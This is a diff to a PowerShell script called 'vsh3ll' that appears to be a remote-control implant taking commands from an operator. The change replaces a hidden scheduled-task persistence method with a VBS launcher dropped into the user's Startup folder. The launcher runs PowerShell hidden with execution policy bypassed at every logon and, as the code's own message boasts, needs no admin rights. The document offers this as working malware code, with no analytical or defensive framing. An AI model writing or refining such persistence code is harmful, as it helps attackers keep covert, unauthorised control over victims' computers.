@@ -74,24 +74,30 @@ function DownloadFile($file_id, $file_name) {
 }
 
 function ManageStartup($action) {
-    $task_name = "vsh3ll_$session_id"
-    $task_cmd  = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script_path`""
+    $startup_dir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+    $vbs_path    = "$startup_dir\vsh3ll_$session_id.vbs"
+    $vbs_content = "Set sh = CreateObject(`"WScript.Shell`")`nsh.Run `"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"`"`"$script_path`"`"`"`", 0, False"
 
     switch ($action) {
         "add" {
-            schtasks /create /tn $task_name /tr $task_cmd /sc onlogon /rl highest /f 2>&1 | Out-Null
-            if ($LASTEXITCODE -eq 0) { SendMessage "Startup added: Task '$task_name' runs at logon (hidden)" }
-            else { SendMessage "Failed to add startup task (try as admin)" }
+            try {
+                Set-Content -Path $vbs_path -Value $vbs_content -Encoding UTF8
+                SendMessage "Startup added: [$vbs_path] (runs hidden at logon, no admin needed)"
+            } catch {
+                SendMessage "Failed: $($Error[0])"
+            }
         }
         "remove" {
-            schtasks /delete /tn $task_name /f 2>&1 | Out-Null
-            if ($LASTEXITCODE -eq 0) { SendMessage "Startup removed: '$task_name'" }
-            else { SendMessage "Task not found or failed to remove" }
+            if (Test-Path $vbs_path) {
+                Remove-Item $vbs_path -Force
+                SendMessage "Startup removed: [$vbs_path]"
+            } else {
+                SendMessage "Startup entry not found"
+            }
         }
         "status" {
-            $query = schtasks /query /tn $task_name 2>&1
-            if ($LASTEXITCODE -eq 0) { SendMessage "Startup: ACTIVE`n$($query | Out-String)" }
-            else { SendMessage "Startup: INACTIVE (task not found)" }
+            if (Test-Path $vbs_path) { SendMessage "Startup: ACTIVE [$vbs_path]" }
+            else { SendMessage "Startup: INACTIVE" }
         }
         default { SendMessage "Usage: startup add | remove | status" }
     }
